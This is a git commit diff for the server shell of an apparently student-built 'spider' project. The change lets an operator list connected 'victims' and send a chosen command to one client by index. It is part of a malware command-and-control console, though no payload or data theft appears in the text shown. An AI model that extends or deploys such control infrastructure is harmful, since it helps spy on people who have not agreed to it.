c5a16012f912450f9e49baf7af87d1df92c179de
Lucas Troncy <lucas.troncy@epitech.eu>
2017-10-14 03:03:10 +0200

    can now select client in shell AControl

--- project/server/Shell.cpp
+++ project/server/Shell.cpp
@@ -1,4 +1,5 @@
 #include <algorithm>
+#include <sstream>
 #include "Shell.h"
 #include "Logger.hpp"
 
@@ -38,25 +39,54 @@ namespace spider
 	  std::string line;
 	  std::getline(std::cin, line);
 
+          if (line == "")
+          {
+            continue;
+          }
 	  if (line == "help")
 	    {
 	      displayHelpMessage();
 	    }
-	  else if (std::find_if(m_commands.begin(), m_commands.end(),
-	                        [&](server::CommandInfo const &m) {
-	                          return m.name == line;
-	                        }) != m_commands.end())
-	    {
-	      // TODO: Allow to select client
-	      server::Event ev;
+          else if (line == "getClient")
+          {
+            std::cout << getNbClient() << " victim connected." << std::endl;
+            continue;
+          }
+          else
+          {
+            std::uint32_t a;
+            char c;
 
-	      ev.destId = 0;
-	      ev.emitter = this;
-	      ev.commandName = line;
+            std::stringstream ss;
+            ss << line;
+            ss >> a;
+            ss >> c;
+            ss >> line;
 
-	      sendToSpider(ev);
-	    }
-	}
+            if (std::find_if(m_commands.begin(), m_commands.end(),
+                  [&](server::CommandInfo const &m) {
+                  return m.name == line;
+                  }) != m_commands.end())
+            {
+              if (a >= getNbClient())
+              {
+                std::cout << "Not enought client to do that." << std::endl;
+              }
+
+              server::Event ev;
+
+              ev.destId = a;
+              ev.emitter = this;
+              ev.commandName = line;
+
+              sendToSpider(ev);
+            }
+            else
+            {
+              std::cout << "Command not found." << std::endl;
+            }
+          }
+        }
       while (m_running && std::cin);
 
       nope::log::Log(Info) << "Stopping Shell control";
@@ -64,11 +94,11 @@ namespace spider
 
     void Shell::displayHelpMessage() const
     {
-      std::cout << "help - Display this message";
+      std::cout << "help - Display this message\ngetClient - get current connected victim";
       for (auto const &cur : m_commands)
-	{
-	  std::cout << '\n' << cur.name << " - " << cur.description;
-	}
+      {
+        std::cout << '\n' << cur.name << " - " << cur.description;
+      }
       std::cout << std::endl;
     }
   }
